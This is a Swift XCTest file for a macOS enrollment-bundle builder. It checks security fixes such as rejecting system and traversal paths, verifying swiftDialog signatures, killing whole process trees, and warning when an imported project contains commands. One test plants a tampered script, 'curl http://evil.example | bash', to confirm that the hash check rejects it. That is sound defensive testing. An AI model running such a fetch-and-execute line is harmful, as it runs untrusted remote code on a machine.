import XCTest
@testable import EnrollmentBundleStudio

/// Covers the fixes from the security and bug review: dangerous device folders, swiftDialog download trust,
/// process-tree timeouts, and the notice shown when a project that carries commands is imported.
final class SecurityReviewFixTests: XCTestCase {
    // MARK: Device folders

    func testDeviceDirectoryRejectsSystemAndShallowFolders() {
        for path in ["/", "/Library", "/Library/", "/Users", "/Applications", "/Library/Application Support", "/Library/Foo"] {
            XCTAssertNotNil(FieldValidator.deviceDirectoryIssue(path), path)
        }
    }

    func testDeviceDirectoryRejectsTraversalDoubleSlashAndControlCharacters() {
        XCTAssertNotNil(FieldValidator.deviceDirectoryIssue("relative/path/here"))
        XCTAssertNotNil(FieldValidator.deviceDirectoryIssue("/Library/Application Support/../../Users"))
        XCTAssertNotNil(FieldValidator.deviceDirectoryIssue("/Library//Application Support/Company"))
        XCTAssertNotNil(FieldValidator.deviceDirectoryIssue("/Library/Application Support/Com\npany"))
    }

    func testDeviceDirectoryAcceptsDedicatedFolders() {
        XCTAssertNil(FieldValidator.deviceDirectoryIssue("/Library/Application Support/Contoso/Enrollment"))
        XCTAssertNil(FieldValidator.deviceDirectoryIssue("/Library/Application Support/Contoso/Enrollment/"))
        XCTAssertNil(FieldValidator.deviceDirectoryIssue(ProjectSettings.makeDefault().installLocation))
        XCTAssertNil(FieldValidator.deviceDirectoryIssue(ProjectSettings.makeDefault().stateDirectory))
    }

    func testValidationBlocksTheBuildForASystemInstallLocation() {
        var project = TestSupport.makeProject()
        project.settings.organizationName = "Contoso"
        project.settings.packageIdentifier = "com.contoso.enrollment.bundle"
        project.settings.bundleIdentifier = "com.contoso.enrollment"
        project.settings.outputDirectoryPath = "/tmp"
        project.settings.installLocation = "/Library"
        project.settings.stateDirectory = "/Users"
        let report = ValidationEngine.validate(project: project, assets: [:], environment: .permissive)
        let components = Set(report.issues.filter { $0.severity == .error }.map { $0.component })
        XCTAssertTrue(components.isSuperset(of: ["Install location", "State directory"]))
        XCTAssertTrue(report.blocksBuild)
    }

    func testDeviceScriptsRefuseSystemFolders() {
        XCTAssertTrue(FrameworkTemplates.libraryCommon.contains("unsafe_directory_reason()"))
        XCTAssertTrue(FrameworkTemplates.libraryState.contains("unsafe_directory_reason \"$state_dir\""))
        let postinstall = FrameworkTemplates.postinstallScript
        let guardRange = postinstall.range(of: "Refusing to change ownership and permissions")
        let chown = postinstall.range(of: "chown -R root:wheel \"$install_dir\"")
        XCTAssertNotNil(guardRange)
        XCTAssertNotNil(chown)
        if let guardRange, let chown {
            XCTAssertTrue(guardRange.lowerBound < chown.lowerBound, "The folder check runs before any recursive change")
        }
    }

    // MARK: swiftDialog download

    func testSwiftDialogPackageMustHaveATrustedSignatureStatus() {
        let library = FrameworkTemplates.libraryDialog
        XCTAssertTrue(library.contains("Status: signed by a developer certificate issued by Apple"))
        XCTAssertTrue(library.contains("($team)"))
    }

    func testSwiftDialogDownloadFallsBackToTheReleasePageWhenTheApiFails() {
        let library = FrameworkTemplates.libraryDialog
        XCTAssertTrue(library.contains("dialog_release_url()"))
        XCTAssertTrue(library.contains("https://github.com/swiftDialog/swiftDialog/releases/latest"))
        XCTAssertTrue(library.contains("releases/expanded_assets/"))
        XCTAssertTrue(library.contains("https://github.com/swiftDialog/swiftDialog/releases/download/*"), "Download URL stays restricted")
    }

    // MARK: Timeouts

    func testTimeoutsStopTheWholeProcessTree() {
        let common = FrameworkTemplates.libraryCommon
        XCTAssertTrue(common.contains("descendant_pids()"))
        XCTAssertTrue(common.contains("signal_pids()"))
        for template in [FrameworkTemplates.libraryCommon, FrameworkTemplates.libraryTaskRunner, FrameworkTemplates.libraryDialog] {
            XCTAssertFalse(template.contains("pkill -TERM -P"), "Only direct children were stopped before")
            XCTAssertFalse(template.contains("pkill -KILL -P"))
        }
        XCTAssertTrue(FrameworkTemplates.libraryTaskRunner.contains("descendant_pids \"$1\""))
    }

    // MARK: Import notice

    func testProjectWithCommandsIsSummarised() throws {
        var document = try TestSupport.makeProjectWithScript()
        document.project.branding.completionCommand = ""
        XCTAssertEqual(document.project.commandSummary, "1 script")
        document.project.branding.completionCommand = "open -a Safari"
        XCTAssertEqual(document.project.commandSummary, "1 script, a completion command")
    }

    func testProjectWithoutCommandsHasNoSummary() {
        var project = TestSupport.makeProject()
        project.branding.completionCommand = ""
        XCTAssertNil(project.commandSummary)
    }

    func testImportingAProjectPackageWarnsAboutCommands() throws {
        let document = try TestSupport.makeProjectWithScript()
        let result = try ConfigurationArchive.importResult(from: document)
        XCTAssertFalse(result.hasErrors)
        XCTAssertTrue(result.issues.contains { $0.severity == .warning && $0.message.contains("will run on enrolled Macs") })
    }

    func testImportingAConfigurationWarnsAboutCommands() throws {
        let document = try TestSupport.makeProjectWithScript()
        let data = try ConfigurationArchive.export(project: document.project, assets: document.assets)
        let result = try ConfigurationArchive.parse(data)
        XCTAssertTrue(result.issues.contains { $0.severity == .warning && $0.message.contains("will run on enrolled Macs") })
    }

    func testProjectPackageImportChecksScriptHashes() throws {
        var document = try TestSupport.makeProjectWithScript()
        let path = try XCTUnwrap(document.project.scripts.first?.relativePath)
        try document.setAsset(Data("#!/bin/bash\ncurl http://evil.example | bash\n".utf8), at: path)
        let result = try ConfigurationArchive.importResult(from: document)
        XCTAssertTrue(result.hasErrors)
        XCTAssertTrue(result.issues.contains { $0.severity == .error && $0.message.contains("hash") })
    }
}
